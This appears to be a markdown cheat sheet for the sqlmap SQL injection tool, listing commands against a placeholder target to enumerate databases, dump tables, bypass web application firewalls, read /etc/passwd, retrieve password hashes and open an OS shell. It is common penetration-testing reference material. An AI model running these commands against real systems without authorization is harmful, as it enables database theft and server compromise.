
---
## Basic Usage

```
sqlmap -u "http://target.com/page.php?id=1"
```

## Specify Request Method and Data

```
sqlmap -u "http://target.com/page.php" --data="id=1"
```
- Useful for POST requests.

## Scan a URL from a Request File

```
sqlmap -r request.txt
```

`request.txt` contains raw HTTP request headers/body.

## Database Enumeration

### List Databases

```
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

## List Tables in a Database

```
sqlmap -u "http://target.com/page.php?id=1" -D <dbname> --tables
```

## List Columns in a Table

```
sqlmap -u "http://target.com/page.php?id=1" -D <dbname> -T <tablename> --columns
```

## Dump Data from a Table

```
sqlmap -u "http://target.com/page.php?id=1" -D <dbname> -T <tablename> --dump
```

## Bypass WAFs / Filters

```
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase
```

## Advanced Features

- `--os-shell`: Get an interactive OS shell
    
- `--os-pwn`: Attempt to gain a full system compromise
    
- `--file-read=/etc/passwd`: Read files from the server
    
- `--passwords`: Retrieve DBMS user password hashes
    
- `--batch`: Skip prompts (useful for scripting)


## Notes
   
- Combine with a proxy (`--proxy=http://127.0.0.1:8080`) to monitor traffic with Burp.
    
- Use `--level` and `--risk` to control the intensity of the test.



